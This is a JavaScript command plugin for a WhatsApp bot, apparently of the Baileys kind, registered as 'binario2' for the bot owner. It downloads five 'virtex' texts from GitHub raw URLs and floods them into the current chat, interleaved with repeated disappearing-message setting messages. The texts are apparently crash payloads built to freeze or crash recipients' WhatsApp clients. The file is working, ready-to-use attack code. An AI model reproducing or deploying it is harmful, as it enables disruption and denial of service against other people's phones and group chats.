let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
let handler = async (m, { conn, text, args }) => {
target = m.chat
conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);                       
virtex = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/1.txt').then(v => v.text());
virtex2 = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/2.txt').then(v => v.text());
virtex3 = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/3.txt').then(v => v.text());
virtex4 = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/4.txt').then(v => v.text());
virtex5 = await require('node-fetch')('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3/master/lib/Binario.txt').then(v => v.text());
m.reply(virtex);
await conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);                       
m.reply(virtex2);
await conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);                       
m.reply(virtex3);
conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);                        
m.reply(virtex4);
await conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);  
m.reply(virtex5);
await conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);                        
}
handler.command = /^binario2$/i
handler.rowner = true
module.exports = handler
